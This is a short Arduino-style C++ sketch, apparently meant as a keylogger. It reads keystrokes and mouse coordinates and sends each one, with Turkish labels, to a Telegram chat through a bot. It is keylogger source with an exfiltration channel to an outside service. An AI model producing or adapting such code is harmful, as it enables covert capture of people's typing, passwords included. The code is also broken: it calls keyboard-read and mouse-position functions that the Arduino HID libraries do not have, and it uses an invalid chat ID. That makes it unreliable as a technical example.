//telegrambot

#include <Wire.h>
#include <Mouse.h>
#include <Keyboard.h>
#include <TelegramBot.h>

#define BOT_TOKEN "token"
#define CHAT_ID ıd

TelegramBot bot(BOT_TOKEN);

void setup() {
  Mouse.begin();
  Keyboard.begin();
}

void loop() {
  if (Keyboard.available()) {
    char key = Keyboard.read();
    String message = "Basılan tuş: ";
    message += key;
    bot.sendMessage(CHAT_ID, message);
  }

  int x, y;
  Mouse.getPosition(x, y);
  String message = "Mouse kordinatları: x=";
  message += x;
  message += ", y=";
  message += y;
  bot.sendMessage(CHAT_ID, message);
}